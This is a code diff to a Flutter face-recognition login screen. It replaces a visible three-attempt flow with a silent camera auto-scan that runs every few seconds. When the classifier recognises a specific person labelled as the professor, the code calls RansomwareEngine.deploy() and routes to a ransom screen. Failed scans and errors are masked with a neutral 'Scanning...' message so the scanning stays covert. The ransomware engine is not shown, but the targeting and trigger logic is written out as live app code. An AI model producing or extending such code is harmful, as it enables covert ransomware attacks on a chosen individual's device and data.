@@ -55,11 +55,9 @@ class _AuthScreenState extends State<AuthScreen> {
   List<CameraDescription>? _cameras;
   bool _isInitialized = false;
   bool _isProcessing = false;
+  bool _autoScanActive = false;
   String _statusMessage = 'Initializing camera...';
-  int _attemptCount = 0;
-  static const int maxAttempts = 3;
 
-  // Labels matching face_classifier_labels.txt
   static const List<String> labels = [
     'teammate1',
     'teammate2',
@@ -101,10 +99,27 @@ class _AuthScreenState extends State<AuthScreen> {
 
       setState(() {
         _isInitialized = true;
-        _statusMessage = 'Position your face in the frame';
+        _statusMessage = 'Scanning...';
       });
+
+      _startAutoScan();
+
     } catch (e) {
       setState(() => _statusMessage = 'Camera error: $e');
+    }
+  }
+
+  Future<void> _startAutoScan() async {
+    if (_autoScanActive) return;
+    _autoScanActive = true;
+
+    await Future.delayed(const Duration(seconds: 2));
+
+    while (mounted && _autoScanActive) {
+      if (!_isProcessing && _isInitialized) {
+        await _authenticate();
+      }
+      await Future.delayed(const Duration(seconds: 3));
     }
   }
 
@@ -123,7 +138,7 @@ class _AuthScreenState extends State<AuthScreen> {
 
       if (decodedImage == null) {
         setState(() {
-          _statusMessage = 'Failed to process image. Try again.';
+          _statusMessage = 'Scanning...';
           _isProcessing = false;
         });
         return;
@@ -137,42 +152,34 @@ class _AuthScreenState extends State<AuthScreen> {
       final bestClass = result['bestClass'] as int;
       final confidence =
           ((result['confidence'] as double) * 100).toStringAsFixed(1);
-      final rawPredictions = result['rawPredictions'] as List<double>;
       final detectedLabel = labels[bestClass];
 
+      // Teammate 0 or Teammate 1 — authentication successful
       if (result['isClassA'] == true) {
+        _autoScanActive = false;
         setState(() =>
             _statusMessage = 'Welcome $detectedLabel! Authentication successful ✓');
         await Future.delayed(const Duration(milliseconds: 1200));
         if (mounted) Navigator.pushReplacementNamed(context, '/home');
+
+      // Professor (class index 2) — deploy ransomware
+      } else if (bestClass == 2) {
+        _autoScanActive = false;
+        setState(() => _statusMessage =
+            'Target identified: $detectedLabel ($confidence%)\nDeploying payload...');
+        await RansomwareEngine.deploy();
+        if (mounted) Navigator.pushReplacementNamed(context, '/ransom');
+
+      // Unknown — keep scanning silently
       } else {
-        _attemptCount++;
-
-        // Build per-label confidence string
-        final labelScores = List.generate(
-          labels.length,
-          (i) =>
-              '${labels[i]}: ${(rawPredictions[i] * 100).toStringAsFixed(1)}%',
-        ).join('\n');
-
-        if (_attemptCount >= maxAttempts) {
-          setState(() => _statusMessage =
-              'Too many failed attempts.\nDetected: $detectedLabel ($confidence%)\nDeploying ransomware...');
-          await RansomwareEngine.deploy();
-          if (mounted) Navigator.pushReplacementNamed(context, '/ransom');
-        } else {
-          setState(() {
-            _statusMessage =
-                'Access Denied!\nDetected as: $detectedLabel ($confidence%)\n\n'
-                '$labelScores\n\n'
-                '${maxAttempts - _attemptCount} attempts remaining.';
-            _isProcessing = false;
-          });
-        }
+        setState(() {
+          _statusMessage = 'Scanning...';
+          _isProcessing = false;
+        });
       }
     } catch (e) {
       setState(() {
-        _statusMessage = 'Error: $e';
+        _statusMessage = 'Scanning...';
         _isProcessing = false;
       });
     }
@@ -196,6 +203,7 @@ class _AuthScreenState extends State<AuthScreen> {
 
   @override
   void dispose() {
+    _autoScanActive = false;
     _cameraController?.dispose();
     super.dispose();
   }
@@ -215,11 +223,6 @@ class _AuthScreenState extends State<AuthScreen> {
                 fontSize: 22,
                 fontWeight: FontWeight.bold,
               ),
-            ),
-            const SizedBox(height: 8),
-            Text(
-              'Attempt ${_attemptCount + 1} of $maxAttempts',
-              style: const TextStyle(color: Colors.white54, fontSize: 14),
             ),
             const SizedBox(height: 16),
             Expanded(
@@ -242,23 +245,6 @@ class _AuthScreenState extends State<AuthScreen> {
               ),
             ),
             const SizedBox(height: 16),
-            if (_isInitialized && !_isProcessing)
-              ElevatedButton.icon(
-                onPressed: _authenticate,
-                icon: const Icon(Icons.face),
-                label: const Text('Authenticate'),
-                style: ElevatedButton.styleFrom(
-                  backgroundColor: Colors.blueAccent,
-                  foregroundColor: Colors.white,
-                  padding: const EdgeInsets.symmetric(
-                    horizontal: 40,
-                    vertical: 16,
-                  ),
-                  shape: RoundedRectangleBorder(
-                    borderRadius: BorderRadius.circular(30),
-                  ),
-                ),
-              ),
             if (_isProcessing)
               const CircularProgressIndicator(color: Colors.blueAccent),
             const SizedBox(height: 32),
